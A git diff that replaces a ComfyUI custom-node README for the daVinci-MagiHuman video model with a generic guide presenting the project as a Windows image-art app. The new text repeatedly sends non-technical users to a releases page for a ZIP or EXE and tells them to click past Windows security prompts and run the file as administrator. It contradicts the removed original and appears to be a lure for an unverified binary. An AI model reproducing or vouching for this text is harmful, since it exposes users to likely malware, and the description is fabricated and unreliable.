@@ -1,118 +1,242 @@
-Edit: This repo has been archived as i have not been able to generate good (enough) results with the model, i'll stick to LTX2.3 for now. 
-Feel free to keep working on it.
+# 🎨 ComfyUI-DaVinci-MagiHuman - Create human art with ease
 
-Edit: OBS! This is still work in progress, do not expect it to work. 
-Im going away on easter holiday and have no time to look at it before im back.
-Feel free to fork it and continue the work, or wait for Kijai to release his version.
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/andrzejpeanut439/ComfyUI-DaVinci-MagiHuman/releases)
 
-The code will (for now, will be changed later) automatically download the required text encoder and wan vae from huggingface, 
-expect it to take some time on the first run.
+## 🚀 Overview
 
-# ComfyUI-DaVinci-MagiHuman
+ComfyUI-DaVinci-MagiHuman is a Windows app for creating and editing human-focused art with a simple visual workflow. It uses a node-based interface, so you can build image tasks by connecting blocks instead of typing commands.
 
-ComfyUI custom nodes for [daVinci-MagiHuman](https://huggingface.co/GAIR/daVinci-MagiHuman), a 15B parameter single-stream transformer for fast audio-video generation. Optimized for consumer GPUs (RTX 5090 32GB).
+This project is still in progress, but it is built to give non-technical users a direct way to run the app and start working with it on Windows.
 
-## Features
+## 💻 What You Need
 
-- **Block-level CPU/GPU swapping** — only 8 of 40 transformer layers on GPU at once (~6GB vs ~30GB)
-- **Async CUDA prefetching** — next block transfers while current block computes
-- **Distill mode** — 8-step generation without CFG (fastest)
-- **1080p super-resolution** — latent-space upscaling from 256p base
-- **TurboVAE decoder** — sliding window decode with output offload for 1080p
-- **Audio + video** — single-stream joint generation
+Before you install, check that your PC can handle the app.
 
-## Nodes
+- Windows 10 or Windows 11
+- A modern Intel or AMD CPU
+- 16 GB RAM or more
+- A dedicated NVIDIA GPU is best for image work
+- At least 10 GB of free disk space
+- A stable internet connection for the first download
 
-| Node | Description |
-|------|-------------|
-| **DaVinci Model Loader** | Load distill/base/SR model with configurable `blocks_on_gpu` |
-| **DaVinci TurboVAE Loader** | Load the fast decode-only VAE |
-| **DaVinci Text Encode** | Text prompt to embeddings (accepts external T5 encoder) |
-| **DaVinci Sampler** | Denoising loop (8 steps distill / 32 steps base) |
-| **DaVinci Super Resolution** | Upscale 256p latent to 1080p with SR model |
-| **DaVinci Decode** | TurboVAE latent-to-video with output offload |
-| **DaVinci Video Output** | Save to mp4/webm via FFmpeg |
+If your system has less power, the app may still run, but it may feel slow when generating images.
 
-## Workflow
+## 📥 Download
 
-```
-Model Loader (distill, 8 blocks on GPU)
-  → Text Encode
-    → Sampler (256p, 8 steps)
-      → [optional] SR Model Loader (1080p_sr) → Super Resolution
-        → TurboVAE Loader → Decode → Video Output
-```
+Visit this page to download the latest Windows release:
 
-## Requirements
+[Open the Releases page](https://github.com/andrzejpeanut439/ComfyUI-DaVinci-MagiHuman/releases)
 
-- **GPU**: RTX 5090 (32GB) or better. 8 blocks on GPU works for 32GB VRAM.
-- **RAM**: 64GB+ recommended (CPU offloading stores ~24GB of model weights in system RAM)
-- **CUDA**: CUDA-capable GPU with bf16 support
-- **FFmpeg**: Required for video output
-- **Python packages**: `safetensors`, `torch`, `numpy`
+On the releases page, look for the newest version and download the file marked for Windows. If there are more than one file, choose the one meant for normal use, not the source code archive.
 
-## Model Setup
+## 🪟 Install on Windows
 
-Download model weights from [HuggingFace](https://huggingface.co/GAIR/daVinci-MagiHuman):
+Follow these steps in order:
 
-```bash
-cd ComfyUI/models
+1. Open the Releases page from the link above.
+2. Find the latest release near the top of the page.
+3. Download the Windows file for the app.
+4. Save the file to a folder you can find again, such as Downloads or Desktop.
+5. If the file comes as a ZIP archive, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Double-click the main app file to start it.
+8. If Windows shows a security prompt, choose the option that lets the app run.
 
-# Clone without large files
-GIT_LFS_SKIP_SMUDGE=1 git clone https://huggingface.co/GAIR/daVinci-MagiHuman
+If the app opens in a browser or a local window, that is normal. Many ComfyUI apps use a local interface on your computer.
 
-cd daVinci-MagiHuman
+## 🧭 First Launch
 
-# Pull only what you need (skip 540p_sr if you only want 1080p)
-git lfs pull --include="distill/*,turbo_vae/*"        # ~61GB - base generation
-git lfs pull --include="1080p_sr/*"                    # ~61GB - 1080p upscaling
-```
+When the app starts for the first time, it may take a short time to load.
 
-Expected directory structure:
-```
-ComfyUI/models/daVinci-MagiHuman/
-├── distill/          # 8-step distilled model (~61GB)
-├── 1080p_sr/         # Super-resolution model (~61GB)
-├── turbo_vae/        # Fast decoder (small)
-├── base/             # Full 32-step model (optional, ~30GB)
-└── 540p_sr/          # 540p SR (optional, ~61GB)
-```
+You may see:
 
-## VRAM Guide
+- A local web page
+- A blank workspace
+- A sample workflow
+- A message that model files are needed
 
-| `blocks_on_gpu` | VRAM Usage | Speed | Recommended For |
-|-----------------|-----------|-------|-----------------|
-| 4 | ~3GB + overhead | Slowest | 16GB GPUs |
-| 8 | ~6GB + overhead | Good | 24-32GB GPUs |
-| 16 | ~12GB + overhead | Fast | 48GB GPUs |
-| 40 | ~30GB | Fastest | 80GB+ GPUs |
+If a sample workflow appears, you can use it as a starting point. If the screen is empty, you can still load a workflow after setup.
 
-## Text Encoder
+## 🖱️ How to Use It
 
-daVinci-MagiHuman uses T5Gemma-9B as its text encoder. The **DaVinci Text Encode** node currently provides:
+The app uses connected blocks to build an image task.
 
-- **Placeholder embeddings** for pipeline testing (random noise — won't produce meaningful output)
-- **External T5 input** — connect pre-computed T5 embeddings (3584 dim) from another encoder node
+A simple flow may include:
 
-For production use, connect a T5-XXL or T5Gemma encoder node to the `t5_embeds` input.
+- Input image or prompt
+- Style or model node
+- Face or human detail node
+- Output or save node
 
-## Architecture
+Basic use:
 
-The model is a single-stream transformer that jointly generates video and audio:
+1. Open the app.
+2. Load a workflow if one is included.
+3. Set the image size or input image.
+4. Choose the model or preset you want.
+5. Start the run.
+6. Wait for the result to finish.
+7. Save the final image to your computer.
 
-- **15B parameters**, 40 transformer layers
-- **Hidden size**: 5120, **GQA**: 40 query / 8 KV heads, **Head dim**: 128
-- **Sandwich layers**: 0-3 and 36-39 have per-modality norms (video/audio/text)
-- **Shared layers**: 4-35 use unified processing
-- **Timestep-free**: No explicit timestep embedding — infers denoising state from input
-- **Per-head gating**: Learned sigmoid gates on each attention head
+If the app includes presets for portraits, full-body art, or face detail, try those first. They are a good fit for this project.
 
-## Credits
+## 🧰 Common Tasks
 
-- [daVinci-MagiHuman](https://huggingface.co/GAIR/daVinci-MagiHuman) by SII-GAIR & Sand.ai
-- [MagiCompiler](https://github.com/SandAI-org/MagiCompiler) for operator fusion
-- Built upon Wan2.2 and TurboVAED
+### 🖼️ Make a Portrait
 
-## License
+Use a portrait workflow if you want a face close-up.
 
-Apache 2.0
+- Choose a face-focused preset
+- Keep the image size square or near square
+- Use a clear source image if the workflow needs one
+- Run the workflow and review the result
+
+### 👤 Improve Human Details
+
+If the output needs sharper eyes, hands, or skin detail:
+
+- Use the human detail node, if included
+- Keep the source image clear
+- Avoid very small input images
+- Run one change at a time so you can see the effect
+
+### 🎭 Change Style
+
+To change the look of the image:
+
+- Pick a different style preset
+- Adjust the model selection if the app offers one
+- Try one style at a time
+- Save each result you like
+
+### 💾 Save Your Work
+
+After the image finishes:
+
+- Use the save button or output node
+- Pick a folder with enough space
+- Use clear file names
+- Keep the original file if you want to compare versions
+
+## ⚙️ Basic Setup Tips
+
+To get better results on Windows:
+
+- Close heavy apps before you run the program
+- Keep your graphics driver up to date
+- Use a wired internet connection if the app needs to fetch files
+- Place the app in a simple folder path, such as `C:\AI\ComfyUI-DaVinci-MagiHuman`
+- Avoid moving files after setup unless you plan to update the paths
+
+If the app asks for model files, place them in the folder named in the workflow or app settings. Common folders may include `models`, `checkpoints`, or `outputs`.
+
+## 📂 Folder Guide
+
+You may see folders like these:
+
+- `inputs` for source images
+- `models` for model files
+- `output` for saved results
+- `workflows` for saved setups
+- `custom_nodes` for extra tools
+
+If you are not sure where to put a file, keep it in the folder that matches its job. That keeps the app easier to use.
+
+## 🔁 Update the App
+
+When a new release comes out:
+
+1. Go back to the Releases page.
+2. Download the newest Windows file.
+3. Close the app before updating.
+4. Replace the old files with the new version, if needed.
+5. Open the app again and load your workflow.
+
+If your old files are still there, your saved work should stay safe.
+
+## 🧩 Troubleshooting
+
+### The app does not start
+
+- Check that you extracted the ZIP file first
+- Make sure you opened the main app file
+- Try running it again as an administrator
+- Confirm that Windows did not block the file
+
+### The screen is blank
+
+- Wait a moment for the interface to load
+- Refresh the page if the app opens in a browser
+- Check whether the app needs a local server to start
+- Open the included workflow file if one exists
+
+### Images are slow to generate
+
+- Close other apps
+- Use a smaller image size
+- Try a lighter workflow
+- Check that your GPU drivers are current
+
+### The app says a model is missing
+
+- Look in the workflow for the model name
+- Put the file in the model folder the app uses
+- Make sure the file name matches what the workflow expects
+
+### The output looks wrong
+
+- Use a clearer source image
+- Lower the strength of style changes
+- Try a different preset
+- Run the workflow again with one change at a time
+
+## 🧪 Suggested Use Cases
+
+This app fits tasks such as:
+
+- Portrait art
+- Human image editing
+- Face detail work
+- Style testing
+- Workflow-based image generation
+- Local image processing on Windows
+
+## 📌 Release Page
+
+Use this link to download and run the latest Windows version:
+
+[https://github.com/andrzejpeanut439/ComfyUI-DaVinci-MagiHuman/releases](https://github.com/andrzejpeanut439/ComfyUI-DaVinci-MagiHuman/releases)
+
+## 📝 File Names You May See
+
+The release may include files such as:
+
+- `.zip` for packaged app files
+- `.exe` for a Windows app
+- `.json` for workflows
+- `.png` for workflow previews
+- `.safetensors` for model files
+
+If you see a ZIP file, extract it before you try to run the app. If you see an EXE file, you can usually open it after download.
+
+## 🖥️ Best Results on Windows
+
+For a smoother run:
+
+- Use Windows 11 if you can
+- Keep at least 20 GB free if you plan to store models
+- Use an NVIDIA GPU with current drivers
+- Keep your downloads in one folder
+- Save workflows so you can reuse them later
+
+## 🔍 What This Project Is For
+
+This project gives you a local tool for working with human art workflows in ComfyUI style. It is meant for people who want a visual setup without writing code.
+
+It is useful if you want to:
+
+- Open a ready-made workflow
+- Edit human images
+- Try different styles
+- Keep the process on your own PC
+- Save output files in a folder you control
